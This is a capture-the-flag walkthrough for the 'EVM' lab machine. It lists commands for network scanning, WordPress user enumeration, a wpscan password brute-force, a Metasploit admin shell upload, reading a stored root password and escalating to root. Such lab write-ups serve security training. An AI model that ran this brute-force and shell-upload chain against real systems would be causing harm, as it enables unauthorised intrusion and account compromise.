# EVM machine walkthrough

Penetration Methodologies:
Network Scanning
Netdiscover
Nmap Scan
Enumeration
Browsing HTTP Service
Directory Bruteforce using dirb
Enumeration Using WPScan
Password Bruteforce using WPScan
Getting Login Credentials
Exploitation
Exploiting using Metasploit
Getting a reverse connection
Spawning a TTY Shell
Enumeration for Root Credentials
Privilege Escalation
Getting Login Credentials
Logging in as root
Reading the Final Flag

============================================
Walkthrough
============================================

sudo netdiscover 
machine ip - 192.168.1.103
nmap -A 192.168.1.103

Some ports open like - 22/tcp , 53/tcp , 80/tcp , 110/tcp , 139,tcp , 143/tcp, 445/tcp

Enumeration :-

As port 80 is open let us try and open the ip in the browser but not result found only apache index.html page found 
The apache webpage opens which is normal except for the fact that there was a comment saying “you can find me at /wordpress/ im vulnerable 😊 “

Now according to this comment, it means there is a vulnerable directory called ‘WordPress’. So to confirm we used dirb command which is:

Directory scanning:-
dirb http://192.168.1.103/
dirb http://192.168.1.103/wordpress

And to no surprise, there is a directory called ‘WordPress’. Now, this is wordpress, as the name suggests, we can use wpscan to find more about it. And for this, type:

Wordpress scanning:-
wpscan --url http://192.168.1.103/wordpress/ -e at -e ap -e u

With this command, we are telling the wpscan to enumerate(-e) all themes(at), all plugins(ap) installed on the wordpress site. And finally, all the users(u) that might be logged in on the WordPress Site

there is a vulnerable plugin c0rrupt3d_brain where we can attack via bruteforce and get a password to log in
So, for our bruteforce, we will use rockyou wordlist and to put it in action type:

Bruteforce:-
wpscan --url http://192.168.1.103/wordpress -U c0rrupt3d_brain -P /usr/share/wordlists/rockyou.txt

And when the bruteforce is successful, it will give you the password i.e. 24992499

Exploitation:-

Now that we know username and password, we can use an inbuilt wordpress exploit from Metasploit. Firstly, start Metasploit by typing ‘msfconsole’ and the type the following command:

use exploit/unix/webapp/wp_admin_shell_upload
set rhosts 192.168.1.103
set targeturi /wordpress
set username c0rrupt3d_brain
set password 24992499
exploit

So, once the exploit is running and attack is successful, you can have your meterpreter session. When you have the meterpreter session, go home by typing cd /home and checklist of things home has to offer by using ls command. There was only on folder there named root3r and when you navigate yourself to that folder and check the list of files with the same command you used before. Here, you will find .root_password_ssh.txt file; upon reading this text file with a cat you will find the password of the root user

cd /home
ls
cd root3r
ls
cat .root_password_ssh.txt

Privilige Escalation:-

Now, we know that the password of the root user is willy26. We can now switch our user to root and for this type:

shell
python -c 'import pty;pty.spawn("/bin/bash")'
su root
willy26

Now you are logged in as root along with its privileges too.

Once you are logged in as a root user, navigate yourself around and go to the root folder by typing cd /root. And there when you will use ls command, you find a proof.txt document. Upon reading it with cat command, it will show you that you have successfully pwned the machine. YAY!!!!!!


